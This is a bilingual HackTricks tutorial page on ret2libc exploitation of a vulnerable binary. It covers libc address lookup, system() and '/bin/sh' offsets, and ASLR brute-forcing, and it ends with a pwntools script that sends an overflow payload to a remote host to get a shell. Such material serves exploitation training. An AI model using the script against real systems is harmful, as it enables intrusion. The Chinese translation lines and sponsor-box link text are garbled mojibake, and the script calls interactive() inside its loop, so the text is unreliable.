

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


**If you have found a vulnerable binary and you think that you can exploit it using Ret2Lib here you can find some basic steps that you can follow.**

**å¦‚æœæ‚¨æ‰¾åˆ°äº†è„†å¼±çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”æ‚¨è®¤ä¸ºå¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨ret2libåˆ©ç”¨å®ƒï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›å¯ä»¥éµå¾ªçš„åŸºæœ¬æ­¥éª¤ã€‚**

# If you are **inside** the **host**

ï¼ƒå¦‚æœæ‚¨æ˜¯**å†…éƒ¨** **ä¸»æœº**

## You can find the **address of lib**c

##æ‚¨å¯ä»¥æ‰¾åˆ°lib ** cçš„**åœ°å€

```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```

If you want to check if the ASLR is changing the address of libc you can do:

å¦‚æœè¦æ£€æŸ¥ASLRæ˜¯å¦æ­£åœ¨æ›´æ”¹LIBCçš„åœ°å€ï¼Œåˆ™å¯ä»¥æ‰§è¡Œï¼š

```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```

## Get offset of system function

##è·å¾—ç³»ç»ŸåŠŸèƒ½çš„æŠµæ¶ˆ

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

## Get offset of "/bin/sh"

##è·å¾—â€œ/bin/shâ€çš„åç§»

```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

## /proc/\<PID>/maps

If the process is creating **children** every time you talk with it (network server) try to **read** that file (probably you will need to be root).

å¦‚æœè¯¥è¿‡ç¨‹æ­£åœ¨åˆ›å»º**å„¿ç«¥**æ¯æ¬¡ä¸ä¹‹äº¤è°ˆæ—¶ï¼ˆç½‘ç»œæœåŠ¡å™¨ï¼‰å°è¯•**è¯»**è¯¥æ–‡ä»¶ï¼ˆå¯èƒ½éœ€è¦æ˜¯rootï¼‰ã€‚

Here you can find **exactly where is the libc loaded** inside the process and **where is going to be loaded** for every children of the process.

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**åœ¨è¯¥è¿‡ç¨‹ä¸­åŠ è½½çš„libcåœ¨å“ªé‡Œï¼Œå¹¶ä¸”**å°†ä¸ºæ¯ä¸ªå­©å­çš„å­©å­åŠ è½½**ã€‚

![](<../../.gitbook/assets/image (95).png>)

In this case it is loaded in **0xb75dc000** (This will be the base address of libc)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå·²åŠ è½½åœ¨** 0xb75dc000 **ä¸­ï¼ˆè¿™å°†æ˜¯LIBCçš„åŸºæœ¬åœ°å€ï¼‰

## Using gdb-peda

Get address of **system** function, of **exit** function and of the string **"/bin/sh"** using gdb-peda:

è·å–**ç³»ç»Ÿ**å‡½æ•°çš„åœ°å€ï¼Œ** exit **å‡½æ•°å’Œå­—ç¬¦ä¸²**â€œ/bin/shâ€ **ä½¿ç”¨gdb-pedaï¼š

```
p system
p exit
find "/bin/sh"
```

# Bypassing ASLR

You can try to bruteforce the abse address of libc.

æ‚¨å¯ä»¥å°è¯•è¿ålibcçš„ABSEåœ°å€ã€‚

```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```

# Code

```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
    p = ""
    p += p32(off + 0x0003cb20) #system
    p += "CCCC" #GARBAGE
    p += p32(off + 0x001388da) #/bin/sh
    payload = 'A'*0x20010 + p
    c.send(payload)
    c.interactive() #?
```


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


